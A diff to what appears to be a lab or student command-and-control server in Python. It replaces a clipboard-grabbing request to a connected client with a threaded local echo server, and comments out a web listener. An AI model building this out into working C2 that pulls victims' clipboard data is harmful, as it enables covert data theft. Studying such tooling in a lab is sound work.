@@ -1,49 +1,49 @@
 import aiohttp
+import threading
 from aiohttp import web
 from datetime import datetime
 import time
 import socket
 import sys
 
-# HTTP server
-
-HOST = "127.0.0.1"
-PORT = 13337
-
-print('CSOC C2 Server')
-
 # Holds post-exploitation commands for the target host that the operator will enter
 commands = {}
 
-# TODO: handle multiple clients
+# HTTP server
 
+
+#===========SERVER CREATION=============
+print('CSOC C2 Server')
+
+HOST = "127.0.0.1"
+PORT = 13337
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((HOST, PORT))
-s.listen()
-conn, addr = s.accept()
+s.listen(5)
 
-print(f"Connected by {addr}")
-data = conn.recv(1024)
-print("Received_data: %s" % data)
+def handle_connection(conn, ip):
+    print(f"Connected by {ip}")
+    msg = conn.recv(1024).decode()
 
-time.sleep(5)
+    #act as echo server
+    while msg != 'quit': 
+        print("Received_data: %s" % msg)
 
-conn.send("clipboard".encode())
-data = conn.recv(1024)
-print("Received clipboard: %s" % data)
+        conn.send(msg.encode())
+        msg = conn.recv(1024).decode()
+    conn.close()
 
-# # Create a TCP/IP socket
-# server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# server.setblocking(0)
 
-# # Bind the socket to the port
-# server_address = ('localhost', 10000)
-# 
-# 
-# 
+# def init_server():
+while True:
+    # create a dedicated thread for each incoming connection
+    conn, addr = s.accept()
+    t = threading.Thread(target=handle_connection, args=(conn, addr))
+    t.start()
 
-# server.listen(5)
+
 # readable, writable, exceptional = select.select(inputs, outputs, inputs)
+
 
 
 # Initial checkin from the client (GET response)# 
@@ -243,7 +243,8 @@ app.add_routes([web.get('/', InitCall),#
 ])
 # 
 # Starting the Server# 
-if __name__ == '__main__':# 
-    web.run_app(app, port=80)
+#if __name__ == '__main__':# 
+#    web.run_app(app, port=80)
+#    handle_connection(conn, addr)
     # 
 # Type 'python actual_server.py' in command line to spin up server
